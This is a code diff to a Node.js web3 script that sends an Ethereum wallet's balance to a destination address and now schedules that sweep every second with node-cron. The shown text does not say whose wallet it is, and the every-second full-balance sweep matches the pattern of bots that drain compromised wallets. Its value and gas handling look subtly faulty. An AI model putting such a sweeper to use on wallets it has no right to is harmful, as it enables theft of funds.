@@ -1,4 +1,5 @@
 const { Web3 } = require('web3');
+const cron = require('node-cron');
 const HDWalletProvider = require('@truffle/hdwallet-provider');
 
 // Node.js version: 14.17.0
@@ -32,7 +33,8 @@ async function sweepWallet() {
     const txObject = {
       from: fromAddress,
       to: destinationAddress,
-      gasPrice: gasPrice,
+      value: web3.utils.toWei(balance,'ether'),
+      gasPrice: web3.utils.toHex(gasPrice),
       gas: gasLimit,
       nonce: transactionCount
     };
@@ -43,10 +45,12 @@ async function sweepWallet() {
     console.log('Transaction hash:', txReceipt.transactionHash);
     console.log('Transaction complete!');
   } catch (error) {
-    console.error('An error occurred:', error);
-    sweepWallet();
+    console.error('An error occurred:', error.error.message);
   }
 }
 
+cron.schedule("*/1 * * * * *", function() {
+  sweepWallet();
+});
+
 // Call the sweepWallet function
-sweepWallet();
